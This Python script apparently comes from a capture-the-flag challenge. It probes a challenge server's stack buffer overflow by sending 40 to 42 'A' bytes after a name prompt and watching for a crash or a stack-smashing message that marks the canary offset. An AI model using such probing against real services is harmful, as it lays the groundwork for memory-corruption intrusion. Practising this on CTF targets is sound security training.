import socket
import ssl
import time
import sys

HOST = "2b4446b928232a49.julec.tf"
PORT = 1337

def test_offset(length):
    try:
        raw = socket.create_connection((HOST, PORT), timeout=5)
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=HOST)
        
        # 1. Send Length
        s.sendall(str(length).encode() + b"\n")
        
        # 2. Wait for prompt "name?"
        # This ensures recv_line is done and we are at the next recv
        buf = b""
        prompt_found = False
        start = time.time()
        while time.time() - start < 3:
            try:
                chunk = s.recv(1024)
                if not chunk: break
                buf += chunk
                if b"what is your name?" in buf:
                    prompt_found = True
                    break
            except TimeoutError:
                break
        
        if not prompt_found:
            print(f"Len {length}: Failed to get prompt.")
            s.close()
            return False

        # 3. Send Payload
        s.sendall(b"A" * length)
        
        # 4. Check crash
        s.settimeout(1.5)
        buf = b""
        crashed = False
        try:
            while True:
                chunk = s.recv(4096)
                if not chunk: 
                    crashed = True
                    break
                buf += chunk
                if b"stack smashing detected" in buf:
                    crashed = True
                    break
        except TimeoutError:
            pass # Alive
            
        s.close()
        
        status = "CRASHED" if crashed else "OK"
        print(f"Len {length}: {status}")
        return crashed
    except Exception as e:
        print(f"Error: {e}")
        return False

print("Checking offsets with sync...")
test_offset(40)
test_offset(41) # Should crash if offset is 40 and we overwrite canary byte 0 with 'A'
test_offset(42)
